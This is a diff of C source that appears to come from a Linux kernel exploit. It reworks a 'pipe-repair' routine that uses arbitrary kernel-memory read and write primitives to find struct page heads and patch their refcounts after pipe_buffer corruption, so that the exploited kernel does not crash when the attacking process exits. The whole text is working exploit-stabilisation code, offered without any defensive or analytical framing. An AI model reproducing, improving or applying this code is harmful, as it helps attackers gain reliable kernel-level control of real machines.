@@ -405,11 +405,13 @@ static int compensate_refcount(int fd, uint64_t Q, const char *label) {
     return 1;
   }
 
-  uintptr_t head = (uintptr_t)Q;
+  uintptr_t head = (uintptr_t)(Q & ~1ULL);
+
   uint64_t compound_head = 0;
-  if (pipe_phys_read_data(fd, head + STRUCT_PAGE_COMPOUND_HEAD_OFF,
-                          &compound_head, sizeof(compound_head)) &&
-      (compound_head & 1)) {
+  ssize_t ch_rd = configfs_read_once(
+      fd, head + STRUCT_PAGE_COMPOUND_HEAD_OFF,
+      &compound_head, sizeof(compound_head));
+  if (ch_rd == (ssize_t)sizeof(compound_head) && (compound_head & 1)) {
     head = (uintptr_t)(compound_head & ~1ULL);
     pr_info("pipe-repair: %s Q=%016llx is tail, head=%016zx\n",
             label, (unsigned long long)Q, head);
@@ -417,9 +419,10 @@ static int compensate_refcount(int fd, uint64_t Q, const char *label) {
 
   uintptr_t rc_addr = head + PAGE_PAGE_TYPE_OFF + 4;
   uint32_t refcount = 0;
-  if (!pipe_phys_read_data(fd, rc_addr, &refcount, sizeof(refcount))) {
-    pr_warning("pipe-repair: %s refcount read FAILED at %016zx\n",
-               label, rc_addr);
+  ssize_t rc_rd = configfs_read_once(fd, rc_addr, &refcount, sizeof(refcount));
+  if (rc_rd != (ssize_t)sizeof(refcount)) {
+    pr_warning("pipe-repair: %s refcount read FAILED at %016zx "
+               "(ret=%zd errno=%d)\n", label, rc_addr, rc_rd, errno);
     return 0;
   }
 
@@ -428,13 +431,15 @@ static int compensate_refcount(int fd, uint64_t Q, const char *label) {
           label, head, rc_addr, (int32_t)refcount);
 
   uint32_t new_rc = refcount + 1;
-  if (!pipe_phys_write_data(fd, rc_addr, &new_rc, sizeof(new_rc))) {
-    pr_warning("pipe-repair: %s refcount write FAILED\n", label);
+  ssize_t rc_wr = configfs_write_once(fd, rc_addr, &new_rc, sizeof(new_rc));
+  if (rc_wr != (ssize_t)sizeof(new_rc)) {
+    pr_warning("pipe-repair: %s refcount write FAILED (ret=%zd errno=%d)\n",
+               label, rc_wr, errno);
     return 0;
   }
 
   uint32_t verify_rc = 0;
-  pipe_phys_read_data(fd, rc_addr, &verify_rc, sizeof(verify_rc));
+  configfs_read_once(fd, rc_addr, &verify_rc, sizeof(verify_rc));
 
   pr_info("pipe-repair: %s refcount %d -> %d (verify=%d) %s\n",
           label, (int32_t)refcount, (int32_t)new_rc, (int32_t)verify_rc,
@@ -468,23 +473,33 @@ static void repair_p0_pipe_corruption(int fd) {
   pr_info("pipe-repair: gate_entry=%016zx probe_entry=%016zx\n",
           gate_entry, probe_entry);
 
-  uint64_t gate_Q = 0, probe_Q = 0;
-  int gate_ok = repair_pipe_buffer_at(fd, gate_entry, "gate", &gate_Q);
-  int probe_ok = repair_pipe_buffer_at(fd, probe_entry, "probe", &probe_Q);
+  uint64_t reclaim_gate_Q = 0, reclaim_probe_Q = 0;
+  int gate_ok = repair_pipe_buffer_at(fd, gate_entry, "gate", &reclaim_gate_Q);
+  int probe_ok = repair_pipe_buffer_at(fd, probe_entry, "probe", &reclaim_probe_Q);
 
-  pr_info("pipe-repair: gate_Q=%016llx probe_Q=%016llx same=%d\n",
-          (unsigned long long)gate_Q, (unsigned long long)probe_Q,
-          gate_Q == probe_Q);
+  uint64_t gate_Q = (uint64_t)p0_gate_page_struct;
+  uint64_t probe_Q = (uint64_t)p0_probe_page_struct;
+
+  pr_info("pipe-repair: reclaim_gate_Q=%016llx reclaim_probe_Q=%016llx\n",
+          (unsigned long long)reclaim_gate_Q, (unsigned long long)reclaim_probe_Q);
+  pr_info("pipe-repair: gate_holder_Q=%016llx (p0_gate_page_struct)\n",
+          (unsigned long long)gate_Q);
+  pr_info("pipe-repair: probe_holder_Q=%016llx (p0_probe_page_struct)\n",
+          (unsigned long long)probe_Q);
+  pr_info("pipe-repair: NOTE: gate_holder tee'd buffers have page=Q with "
+          "VALID ops — these are the real corruption source\n");
 
   int gate_rc = 1, probe_rc = 1;
   if (gate_Q != 0) {
-    gate_rc = compensate_refcount(fd, gate_Q, "gate");
+    pr_info("pipe-repair: compensating gate_holder Q refcount "
+            "(prevents put_page crash on process death)\n");
+    gate_rc = compensate_refcount(fd, gate_Q, "gate-holder");
   }
   if (probe_Q != 0 && probe_Q != gate_Q) {
-    probe_rc = compensate_refcount(fd, probe_Q, "probe");
-  } else if (probe_Q == gate_Q && probe_Q != 0) {
-    pr_info("pipe-repair: probe Q same as gate Q, compensating once more\n");
-    probe_rc = compensate_refcount(fd, probe_Q, "probe-same-Q");
+    pr_info("pipe-repair: compensating probe_holder Q refcount\n");
+    probe_rc = compensate_refcount(fd, probe_Q, "probe-holder");
+  } else if (probe_Q != 0) {
+    pr_info("pipe-repair: probe Q same as gate Q — skipping duplicate\n");
   }
 
   pr_info("pipe-repair: === summary: gate=%d/%d probe=%d/%d ===\n",
